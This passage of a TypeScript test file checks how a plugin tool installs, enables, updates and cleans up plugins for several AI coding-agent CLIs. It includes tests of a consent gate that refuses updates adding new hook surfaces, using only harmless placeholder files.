    const { pluginRoot, versionHome, plugin } = setupOpenCodePlugin();
    fs.mkdirSync(path.join(pluginRoot, 'opencode'), { recursive: true });
    fs.writeFileSync(
      path.join(pluginRoot, 'opencode', 'index.ts'),
      'export const MyPlugin = async () => ({});\n'
    );

    const { syncPluginToVersion, isPluginSynced, openCodePluginsDir } = await import('./plugins.js');
    const r = syncPluginToVersion(plugin, 'opencode', versionHome);
    expect(r.success).toBe(true);

    const dest = path.join(openCodePluginsDir(versionHome), 'myplugin.ts');
    expect(fs.existsSync(dest)).toBe(true);
    expect(fs.readFileSync(dest, 'utf-8')).toContain('MyPlugin');
    expect(isPluginSynced(plugin, 'opencode', versionHome)).toBe(true);
  });

  it('flattens multiple modules into loader-visible direct .ts files (RUSH-1617)', async () => {
    const { pluginRoot, versionHome, plugin } = setupOpenCodePlugin();
    fs.mkdirSync(path.join(pluginRoot, 'plugins'), { recursive: true });
    fs.writeFileSync(path.join(pluginRoot, 'plugins', 'a.ts'), 'export const A = 1;\n');
    fs.writeFileSync(path.join(pluginRoot, 'plugins', 'b.ts'), 'export const B = 2;\n');
    // .mjs is not loader-visible for local plugins — must be ignored.
    fs.writeFileSync(path.join(pluginRoot, 'plugins', 'skip.mjs'), 'export const S = 0;\n');

    const { syncPluginToVersion, openCodePluginsDir } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'opencode', versionHome);

    const destDir = openCodePluginsDir(versionHome);
    expect(fs.existsSync(path.join(destDir, 'myplugin-a.ts'))).toBe(true);
    expect(fs.existsSync(path.join(destDir, 'myplugin-b.ts'))).toBe(true);
    expect(fs.existsSync(path.join(destDir, 'myplugin-skip.mjs'))).toBe(false);
    // Modules must not live only inside a nested dir the loader never scans.
    expect(fs.existsSync(path.join(destDir, 'myplugin', 'a.ts'))).toBe(false);
  });

  it('installs a managed marker when no TS/JS modules exist', async () => {
    const { versionHome, plugin } = setupOpenCodePlugin();
    const { syncPluginToVersion, isPluginSynced, openCodePluginsDir } = await import('./plugins.js');
    const r = syncPluginToVersion(plugin, 'opencode', versionHome);
    expect(r.success).toBe(true);
    expect(isPluginSynced(plugin, 'opencode', versionHome)).toBe(true);
    const marker = path.join(openCodePluginsDir(versionHome), 'myplugin', '.agents-cli-managed');
    expect(fs.existsSync(marker)).toBe(true);
  });

  it('removePluginFromVersion deletes the installed modules', async () => {
    const { pluginRoot, versionHome, plugin } = setupOpenCodePlugin();
    fs.mkdirSync(path.join(pluginRoot, 'opencode'), { recursive: true });
    fs.writeFileSync(path.join(pluginRoot, 'opencode', 'index.ts'), 'export const X = 1;\n');

    const { syncPluginToVersion, removePluginFromVersion, isPluginSynced } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'opencode', versionHome);
    expect(isPluginSynced(plugin, 'opencode', versionHome)).toBe(true);

    removePluginFromVersion(plugin.name, pluginRoot, 'opencode', versionHome);
    expect(isPluginSynced(plugin, 'opencode', versionHome)).toBe(false);
  });
});

// ─── syncPluginToVersion: Cursor (.cursor + .cursor-plugin manifest) ─────────

describePlugins('syncPluginToVersion (cursor native marketplace install)', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  function setupCursorPlugin(name = 'myplugin'): {
    pluginRoot: string;
    versionHome: string;
    plugin: DiscoveredPlugin;
  } {
    const pluginRoot = path.join(tmpDir, name);
    fs.mkdirSync(path.join(pluginRoot, '.claude-plugin'), { recursive: true });
    fs.writeFileSync(
      path.join(pluginRoot, '.claude-plugin', 'plugin.json'),
      JSON.stringify({ name, version: '1.0.0', description: 'test', author: { name: 'tester' } })
    );
    const versionHome = path.join(tmpDir, `${name}-home`);
    fs.mkdirSync(path.join(versionHome, '.cursor'), { recursive: true });
    const plugin: DiscoveredPlugin = {
      name,
      root: pluginRoot,
      manifest: { name, version: '1.0.0', description: 'test' },
      skills: [],
      hooks: [],
      scripts: [],
      commands: [],
      agentDefs: [],
      workflows: [],
      memory: [],

      bin: [],
      mcpServers: [],
      lspServers: [],
      monitors: [],
      hasMcp: false,
      hasSettings: false,
    };
    return { pluginRoot, versionHome, plugin };
  }

  it('copies plugin into .cursor/plugins/marketplaces/agents-cli/plugins/<name>/', async () => {
    const { pluginRoot, versionHome, plugin } = setupCursorPlugin();
    fs.writeFileSync(path.join(pluginRoot, 'README.md'), '# hi');

    const { syncPluginToVersion } = await import('./plugins.js');
    const r = syncPluginToVersion(plugin, 'cursor', versionHome);
    expect(r.success).toBe(true);

    const installDir = path.join(
      versionHome,
      '.cursor',
      'plugins',
      'marketplaces',
      'agents-cli',
      'plugins',
      'myplugin'
    );
    expect(fs.existsSync(path.join(installDir, '.claude-plugin', 'plugin.json'))).toBe(true);
    expect(fs.existsSync(path.join(installDir, 'README.md'))).toBe(true);
  });

  it('mirrors the manifest into .cursor-plugin/plugin.json', async () => {
    const { versionHome, plugin } = setupCursorPlugin();
    const { syncPluginToVersion, isPluginSynced } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'cursor', versionHome);

    const installDir = path.join(
      versionHome,
      '.cursor',
      'plugins',
      'marketplaces',
      'agents-cli',
      'plugins',
      'myplugin'
    );
    const cursorManifest = path.join(installDir, '.cursor-plugin', 'plugin.json');
    expect(fs.existsSync(cursorManifest)).toBe(true);
    const parsed = JSON.parse(fs.readFileSync(cursorManifest, 'utf-8'));
    expect(parsed.name).toBe('myplugin');
    expect(isPluginSynced(plugin, 'cursor', versionHome)).toBe(true);
  });
});

// ─── syncPluginToVersion: Goose (Open Plugins under .agents/plugins/) ────────

describePlugins('syncPluginToVersion (goose Open Plugins install)', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  function setupGoosePlugin(name = 'myplugin'): {
    pluginRoot: string;
    versionHome: string;
    plugin: DiscoveredPlugin;
  } {
    const pluginRoot = path.join(tmpDir, name);
    fs.mkdirSync(path.join(pluginRoot, '.claude-plugin'), { recursive: true });
    fs.writeFileSync(
      path.join(pluginRoot, '.claude-plugin', 'plugin.json'),
      JSON.stringify({ name, version: '1.0.0', description: 'test', author: { name: 'tester' } })
    );
    fs.mkdirSync(path.join(pluginRoot, 'hooks'), { recursive: true });
    fs.writeFileSync(
      path.join(pluginRoot, 'hooks', 'hooks.json'),
      JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'echo hi' }] }] } })
    );
    const versionHome = path.join(tmpDir, `${name}-home`);
    fs.mkdirSync(versionHome, { recursive: true });
    const plugin: DiscoveredPlugin = {
      name,
      root: pluginRoot,
      manifest: { name, version: '1.0.0', description: 'test' },
      skills: [],
      hooks: ['SessionStart'],
      scripts: [],
      commands: [],
      agentDefs: [],
      workflows: [],
      memory: [],

      bin: [],
      mcpServers: [],
      lspServers: [],
      monitors: [],
      hasMcp: false,
      hasSettings: false,
    };
    return { pluginRoot, versionHome, plugin };
  }

  it('copies the full plugin into versionHome/.agents/plugins/<name>/', async () => {
    const { versionHome, plugin } = setupGoosePlugin();
    const { syncPluginToVersion, isPluginSynced, goosePluginsDir } = await import('./plugins.js');
    const r = syncPluginToVersion(plugin, 'goose', versionHome);
    expect(r.success).toBe(true);
    const dest = path.join(goosePluginsDir(versionHome), 'myplugin');
    expect(fs.existsSync(path.join(dest, '.claude-plugin', 'plugin.json'))).toBe(true);
    expect(fs.existsSync(path.join(dest, 'hooks', 'hooks.json'))).toBe(true);
    expect(fs.existsSync(path.join(dest, '.agents-cli-managed'))).toBe(true);
    expect(isPluginSynced(plugin, 'goose', versionHome)).toBe(true);
  });

  it('removePluginFromVersion deletes the installed plugin dir', async () => {
    const { pluginRoot, versionHome, plugin } = setupGoosePlugin();
    const { syncPluginToVersion, removePluginFromVersion, isPluginSynced } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'goose', versionHome);
    removePluginFromVersion(plugin.name, pluginRoot, 'goose', versionHome);
    expect(isPluginSynced(plugin, 'goose', versionHome)).toBe(false);
  });
});

// ─── syncPluginToVersion: Hermes (flat plugins/ + config.yaml enable toggle) ──

describePlugins('syncPluginToVersion (hermes plugin install)', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  function setupHermesPlugin(name = 'myplugin', withHooks = false): {
    pluginRoot: string;
    versionHome: string;
    plugin: DiscoveredPlugin;
  } {
    const pluginRoot = path.join(tmpDir, name);
    fs.mkdirSync(path.join(pluginRoot, '.claude-plugin'), { recursive: true });
    fs.writeFileSync(
      path.join(pluginRoot, '.claude-plugin', 'plugin.json'),
      JSON.stringify({ name, version: '2.1.0', description: 'a hermes plugin', author: { name: 'tester' } })
    );
    if (withHooks) {
      fs.mkdirSync(path.join(pluginRoot, 'hooks'), { recursive: true });
      fs.writeFileSync(
        path.join(pluginRoot, 'hooks', 'hooks.json'),
        JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'echo hi' }] }] } })
      );
    }
    const versionHome = path.join(tmpDir, `${name}-home`);
    fs.mkdirSync(versionHome, { recursive: true });
    const plugin: DiscoveredPlugin = {
      name,
      root: pluginRoot,
      manifest: { name, version: '2.1.0', description: 'a hermes plugin' },
      skills: [],
      hooks: withHooks ? ['SessionStart'] : [],
      scripts: [],
      commands: [],
      agentDefs: [],
      workflows: [],
      memory: [],
      bin: [],
      mcpServers: [],
      lspServers: [],
      monitors: [],
      hasMcp: false,
      hasSettings: false,
    };
    return { pluginRoot, versionHome, plugin };
  }

  it('installs a flat plugin dir with a plugin.yaml manifest and enables it in config.yaml', async () => {
    const { versionHome, plugin } = setupHermesPlugin();
    const { syncPluginToVersion, isPluginSynced, hermesPluginsDir } = await import('./plugins.js');
    const r = syncPluginToVersion(plugin, 'hermes', versionHome, { allowExecSurfaces: true });
    expect(r.success).toBe(true);

    const dest = path.join(hermesPluginsDir(versionHome), 'myplugin');
    // Flat layout — no marketplaces/ sublayer.
    expect(fs.existsSync(dest)).toBe(true);
    expect(dest.includes(`${path.sep}marketplaces${path.sep}`)).toBe(false);
    expect(fs.existsSync(path.join(dest, '.agents-cli-managed'))).toBe(true);

    // YAML manifest (not plugin.json) with name/version/description.
    const manifestPath = path.join(dest, 'plugin.yaml');
    expect(fs.existsSync(manifestPath)).toBe(true);
    const manifest = yaml.parse(fs.readFileSync(manifestPath, 'utf-8')) as { name: string; version: string; description: string };
    expect(manifest).toEqual({ name: 'myplugin', version: '2.1.0', description: 'a hermes plugin' });

    // Enable toggle: plugins.enabled allowlist in config.yaml.
    const config = yaml.parse(fs.readFileSync(path.join(versionHome, '.hermes', 'config.yaml'), 'utf-8')) as { plugins?: { enabled?: string[] } };
    expect(config.plugins?.enabled).toEqual(['myplugin']);

    expect(isPluginSynced(plugin, 'hermes', versionHome)).toBe(true);
  });

  it('does NOT enable a plugin with exec surfaces unless allowExecSurfaces is set', async () => {
    const { versionHome, plugin } = setupHermesPlugin('hooky', true);
    const { syncPluginToVersion } = await import('./plugins.js');
    const r = syncPluginToVersion(plugin, 'hermes', versionHome); // no allowExecSurfaces
    expect(r.success).toBe(true);
    // Files are installed, but the plugin is NOT added to the enabled allowlist.
    const configPath = path.join(versionHome, '.hermes', 'config.yaml');
    const enabled = fs.existsSync(configPath)
      ? ((yaml.parse(fs.readFileSync(configPath, 'utf-8')) as { plugins?: { enabled?: string[] } }).plugins?.enabled ?? [])
      : [];
    expect(enabled).not.toContain('hooky');
  });

  it('preserves existing config.yaml keys and other enabled entries when enabling', async () => {
    const { versionHome, plugin } = setupHermesPlugin();
    const configPath = path.join(versionHome, '.hermes', 'config.yaml');
    fs.mkdirSync(path.dirname(configPath), { recursive: true });
    fs.writeFileSync(configPath, yaml.stringify({ mcp_servers: { foo: { url: 'http://x' } }, plugins: { enabled: ['other'], disabled: ['banned'] } }), 'utf-8');

    const { syncPluginToVersion } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'hermes', versionHome, { allowExecSurfaces: true });

    const config = yaml.parse(fs.readFileSync(configPath, 'utf-8')) as { mcp_servers?: unknown; plugins?: { enabled?: string[]; disabled?: string[] } };
    expect(config.mcp_servers).toEqual({ foo: { url: 'http://x' } });
    expect(config.plugins?.enabled).toEqual(['other', 'myplugin']);
    expect(config.plugins?.disabled).toEqual(['banned']); // deny-list untouched
  });

  it('does not disable an already-enabled exec-surface plugin on an un-flagged re-sync', async () => {
    // A plugin with hooks that the user deliberately enabled via allowExecSurfaces
    // must stay in plugins.enabled across ordinary background re-syncs (which pass
    // no flag) — the install path must never DOWN-toggle the allowlist.
    const { versionHome, plugin } = setupHermesPlugin('hooky', true);
    const { syncPluginToVersion } = await import('./plugins.js');
    const configPath = path.join(versionHome, '.hermes', 'config.yaml');
    const enabled = () => (yaml.parse(fs.readFileSync(configPath, 'utf-8')) as { plugins?: { enabled?: string[] } }).plugins?.enabled ?? [];

    syncPluginToVersion(plugin, 'hermes', versionHome, { allowExecSurfaces: true });
    expect(enabled()).toContain('hooky');

    // Re-sync WITHOUT the flag (as the staleness writer does) — must stay enabled.
    syncPluginToVersion(plugin, 'hermes', versionHome);
    expect(enabled()).toContain('hooky');
  });

  it('removePluginFromVersion deletes the dir and drops it from plugins.enabled', async () => {
    const { pluginRoot, versionHome, plugin } = setupHermesPlugin();
    const { syncPluginToVersion, removePluginFromVersion, isPluginSynced } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'hermes', versionHome, { allowExecSurfaces: true });
    removePluginFromVersion(plugin.name, pluginRoot, 'hermes', versionHome);
    expect(isPluginSynced(plugin, 'hermes', versionHome)).toBe(false);
    const config = yaml.parse(fs.readFileSync(path.join(versionHome, '.hermes', 'config.yaml'), 'utf-8')) as { plugins?: { enabled?: string[] } };
    expect(config.plugins?.enabled ?? []).not.toContain('myplugin');
  });
});

// ─── updatePlugin — quarantine + capability-diff consent gate (RUSH-1757) ─────

describePlugins('updatePlugin exec-surface consent gate', () => {
  let tmpDir: string;
  let pluginsDir: string;
  let sourceDir: string;

  // Install a local-source plugin at pluginsDir/<name> whose .source points at a
  // mutable upstream (sourceDir). Returns the paths so the test can mutate the
  // upstream to simulate an update.
  function install(name: string, seed: (root: string) => void): { pluginRoot: string; upstream: string } {
    const upstream = path.join(sourceDir, name);
    fs.mkdirSync(path.join(upstream, '.claude-plugin'), { recursive: true });
    fs.writeFileSync(
      path.join(upstream, '.claude-plugin', 'plugin.json'),
      JSON.stringify({ name, version: '1.0.0', description: 'Test' }),
      'utf-8'
    );
    seed(upstream);

    const pluginRoot = path.join(pluginsDir, name);
    fs.cpSync(upstream, pluginRoot, { recursive: true });
    fs.writeFileSync(
      path.join(pluginRoot, '.source'),
      JSON.stringify({ source: upstream, isGit: false, version: '1.0.0' }),
      'utf-8'
    );
    return { pluginRoot, upstream };
  }

  async function loadUpdate() {
    vi.resetModules();
    vi.doMock('../state.js', async (importOriginal) => {
      const actual = await importOriginal<typeof import('../state.js')>();
      return {
        ...actual,
        getPluginsDir: () => pluginsDir,
        getEnabledExtraRepos: () => [],
        getProjectPluginsDir: () => null,
        getSystemPluginsDir: () => path.join(tmpDir, 'no-system'),
      };
    });
    return import('./plugins.js');
  }

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-update-'));
    pluginsDir = path.join(tmpDir, 'plugins');
    sourceDir = path.join(tmpDir, 'source');
    fs.mkdirSync(pluginsDir, { recursive: true });
    fs.mkdirSync(sourceDir, { recursive: true });
  });

  afterEach(() => {
    vi.doUnmock('../state.js');
    vi.resetModules();
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('applies a benign update (no new exec surfaces) and swaps in the new content', async () => {
    const { pluginRoot, upstream } = install('benign', () => {});
    // Upstream ships a new benign resource and bumps its version.
    fs.mkdirSync(path.join(upstream, 'skills'), { recursive: true });
    fs.writeFileSync(path.join(upstream, 'skills', 'new.md'), '# new skill\n', 'utf-8');
    fs.writeFileSync(
      path.join(upstream, '.claude-plugin', 'plugin.json'),
      JSON.stringify({ name: 'benign', version: '1.1.0', description: 'Test' }),
      'utf-8'
    );

    const { updatePlugin } = await loadUpdate();
    const result = await updatePlugin('benign');

    expect(result.success).toBe(true);
    expect(result.blockedByExecSurfaces).toBeUndefined();
    expect(fs.existsSync(path.join(pluginRoot, 'skills', 'new.md'))).toBe(true);
    // .source re-stamped to the fresh manifest version.
    const src = JSON.parse(fs.readFileSync(path.join(pluginRoot, '.source'), 'utf-8'));
    expect(src.version).toBe('1.1.0');
    // Quarantine dir cleaned up.
    expect(fs.existsSync(path.join(pluginsDir, '.benign.update-quarantine'))).toBe(false);
  });

  it('refuses an update that introduces a NEW exec surface and keeps the old content', async () => {
    const { pluginRoot, upstream } = install('gains-hooks', () => {});
    // Upstream is compromised to add a hooks/ surface.
    fs.mkdirSync(path.join(upstream, 'hooks'), { recursive: true });
    fs.writeFileSync(path.join(upstream, 'hooks', 'evil.json'), '{}', 'utf-8');

    const { updatePlugin } = await loadUpdate();
    const result = await updatePlugin('gains-hooks');

    expect(result.success).toBe(false);
    expect(result.blockedByExecSurfaces).toBe(true);
    expect(result.newExecSurfaces).toContain('hooks/');
    // Last-good content preserved — the hostile hooks/ never landed.
    expect(fs.existsSync(path.join(pluginRoot, 'hooks'))).toBe(false);
    // No quarantine residue.
    expect(fs.existsSync(path.join(pluginsDir, '.gains-hooks.update-quarantine'))).toBe(false);
  });

  it('applies the surface-introducing update when consent is given', async () => {
    const { pluginRoot, upstream } = install('gains-hooks-ok', () => {});
    fs.mkdirSync(path.join(upstream, 'hooks'), { recursive: true });
    fs.writeFileSync(path.join(upstream, 'hooks', 'trusted.json'), '{}', 'utf-8');

    const { updatePlugin } = await loadUpdate();
    const result = await updatePlugin('gains-hooks-ok', { allowExecSurfaces: true });

    expect(result.success).toBe(true);
    expect(result.hasExecSurfaces).toBe(true);
    expect(fs.existsSync(path.join(pluginRoot, 'hooks', 'trusted.json'))).toBe(true);
  });

  it('does not gate a surface the plugin already carried (not a NEW surface)', async () => {
    // Both the installed revision and the upstream ship hooks/ — the surface is
    // pre-existing, so an update must not re-trigger the consent gate.
    const { pluginRoot, upstream } = install('already-hooks', (root) => {
      fs.mkdirSync(path.join(root, 'hooks'), { recursive: true });
      fs.writeFileSync(path.join(root, 'hooks', 'existing.json'), '{}', 'utf-8');
    });
    // Upstream ships a benign change on top of the existing surface.
    fs.writeFileSync(path.join(upstream, 'hooks', 'existing.json'), '{"v":2}', 'utf-8');

    const { updatePlugin } = await loadUpdate();
    const result = await updatePlugin('already-hooks');

    expect(result.success).toBe(true);
    expect(result.blockedByExecSurfaces).toBeUndefined();
    expect(fs.readFileSync(path.join(pluginRoot, 'hooks', 'existing.json'), 'utf-8')).toContain('"v":2');
  });
});

// PHNX-2618: a `code` plugin moved from the user repo to the system repo, leaving a stale shadow
// copy that name-keyed orphan detection kept alive. Real sync + cleanup path, no mocks.

describePlugins('cleanOrphanedPluginSkills across marketplaces (PHNX-2618 shadow)', () => {
  let tmpDir: string;
  let userDir: string;
  let systemDir: string;
  let extraRepo: string;
  let versionHome: string;
  let trashDir: string;

  // A plugin that ships one skill, so a stale copy is visibly serving a skill.
  function writePlugin(pluginsDir: string, name: string, skill = `${name}-skill`): string {
    const root = path.join(pluginsDir, name);
    fs.mkdirSync(path.join(root, '.claude-plugin'), { recursive: true });
    fs.writeFileSync(
      path.join(root, '.claude-plugin', 'plugin.json'),
      JSON.stringify({ name, version: '1.0.0', description: `${name} plugin` })
    );
    const skillDir = path.join(root, 'skills', skill);
    fs.mkdirSync(skillDir, { recursive: true });
    fs.writeFileSync(path.join(skillDir, 'SKILL.md'), `# ${name}:${skill}`);
    return root;
  }

  function installedPluginDir(marketplace: string, name: string): string {
    return path.join(versionHome, '.claude', 'plugins', 'marketplaces', marketplace, 'plugins', name);
  }

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-shadow-'));
    userDir = path.join(tmpDir, 'user', 'plugins');
    systemDir = path.join(tmpDir, 'system', 'plugins');
    extraRepo = path.join(tmpDir, 'agents-extras'); // ~/.agents-extras/ for alias "extras"
    versionHome = path.join(tmpDir, 'version-home');
    trashDir = path.join(tmpDir, 'trash', 'plugins');
    fs.mkdirSync(userDir, { recursive: true });
    fs.mkdirSync(systemDir, { recursive: true });
    fs.mkdirSync(path.join(extraRepo, 'plugins'), { recursive: true });
    fs.mkdirSync(versionHome, { recursive: true });
  });

  afterEach(() => {
    vi.doUnmock('../state.js');
    vi.resetModules();
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  async function withState(
    overrides: Partial<typeof import('../state.js')>,
    fn: (mod: typeof import('./plugins.js')) => Promise<void> | void
  ) {
    vi.resetModules();
    vi.doMock('../state.js', async (importOriginal) => {
      const actual = await importOriginal<typeof import('../state.js')>();
      return {
        ...actual,
        getPluginsDir: () => userDir,
        getSystemPluginsDir: () => systemDir,
        getEnabledExtraRepos: () => [],
        getProjectPluginsDir: () => null,
        getExtraPluginsDir: (alias: string) =>
          alias === 'extras' ? path.join(extraRepo, 'plugins') : path.join(tmpDir, `agents-${alias}`, 'plugins'),
        getTrashPluginsDir: () => trashDir,
        ...overrides,
      };
    });
    try {
      const mod = await import('./plugins.js');
      await fn(mod);
    } finally {
      vi.doUnmock('../state.js');
      vi.resetModules();
    }
  }

  it('trashes the stale agents-cli `code` after it moved to agents-system, keeping the current copy', async () => {
    // Lineage: `code` was in the user repo AND the system repo. Install both.
    writePlugin(userDir, 'code');
    writePlugin(systemDir, 'code');

    await withState({}, ({ discoverPlugins, syncPluginToVersion, cleanOrphanedPluginSkills }) => {
      for (const p of discoverPlugins()) {
        expect(syncPluginToVersion(p, 'claude', versionHome, { version: '1.0.0' }).success).toBe(true);
      }
      // Both marketplaces installed the plugin.
      expect(fs.existsSync(installedPluginDir('agents-cli', 'code'))).toBe(true);
      expect(fs.existsSync(installedPluginDir('agents-system', 'code'))).toBe(true);

      // `code` moves out of the user repo entirely — now only agents-system ships it.
      fs.rmSync(path.join(userDir, 'code'), { recursive: true, force: true });
      const active = discoverPlugins();
      expect(active.filter((p) => p.name === 'code').map((p) => p.marketplace)).toEqual(['agents-system']);

      const removed = cleanOrphanedPluginSkills('claude', versionHome, active, '1.0.0');

      // The shadow is gone; the current copy survives.
      expect(removed).toContain('code');
      expect(fs.existsSync(installedPluginDir('agents-cli', 'code'))).toBe(false);
      expect(fs.existsSync(installedPluginDir('agents-system', 'code'))).toBe(true);
    });
  });

  it('keeps BOTH copies while the same name is a live source in each marketplace (healthy path)', async () => {
    writePlugin(userDir, 'code');
    writePlugin(systemDir, 'code');

    await withState({}, ({ discoverPlugins, syncPluginToVersion, cleanOrphanedPluginSkills }) => {
      for (const p of discoverPlugins()) {
        expect(syncPluginToVersion(p, 'claude', versionHome, { version: '1.0.0' }).success).toBe(true);
      }
      // Both sources still present — nothing is stale.
      const removed = cleanOrphanedPluginSkills('claude', versionHome, discoverPlugins(), '1.0.0');

      expect(removed).toEqual([]);
      expect(fs.existsSync(installedPluginDir('agents-cli', 'code'))).toBe(true);
      expect(fs.existsSync(installedPluginDir('agents-system', 'code'))).toBe(true);
    });
  });

  it('keeps a still-present user plugin while trashing the moved one in the same pass', async () => {
    writePlugin(userDir, 'code');
    writePlugin(systemDir, 'code');
    writePlugin(userDir, 'keeper');

    await withState({}, ({ discoverPlugins, syncPluginToVersion, cleanOrphanedPluginSkills }) => {
      for (const p of discoverPlugins()) {
        expect(syncPluginToVersion(p, 'claude', versionHome, { version: '1.0.0' }).success).toBe(true);
      }
      fs.rmSync(path.join(userDir, 'code'), { recursive: true, force: true });

      const removed = cleanOrphanedPluginSkills('claude', versionHome, discoverPlugins(), '1.0.0');

      expect(removed).toEqual(['code']);
      expect(fs.existsSync(installedPluginDir('agents-cli', 'code'))).toBe(false);
      expect(fs.existsSync(installedPluginDir('agents-cli', 'keeper'))).toBe(true);
    });
  });

  it('lenient fallback: does not trash an install whose source marketplace is unreachable', async () => {
    // `code` is installed from the user repo and an extra repo, then the extra repo is disabled.
    // Its source is unreachable, so that install must be kept: only a present, authoritative source
    // repo may clean.
    writePlugin(userDir, 'code');
    writePlugin(path.join(extraRepo, 'plugins'), 'code');

    await withState(
      { getEnabledExtraRepos: () => [{ alias: 'extras', dir: extraRepo, url: '' }] },
      ({ discoverPlugins, syncPluginToVersion }) => {
        for (const p of discoverPlugins()) {
          expect(syncPluginToVersion(p, 'claude', versionHome, { version: '1.0.0' }).success).toBe(true);
        }
        expect(fs.existsSync(installedPluginDir('agents-extras', 'code'))).toBe(true);
      }
    );

    // Re-run with the extra repo disabled AND its source directory removed.
    fs.rmSync(extraRepo, { recursive: true, force: true });
    await withState({}, ({ discoverPlugins, cleanOrphanedPluginSkills }) => {
      const removed = cleanOrphanedPluginSkills('claude', versionHome, discoverPlugins(), '1.0.0');
      expect(removed).not.toContain('code');
      expect(fs.existsSync(installedPluginDir('agents-extras', 'code'))).toBe(true);
    });
  });
});
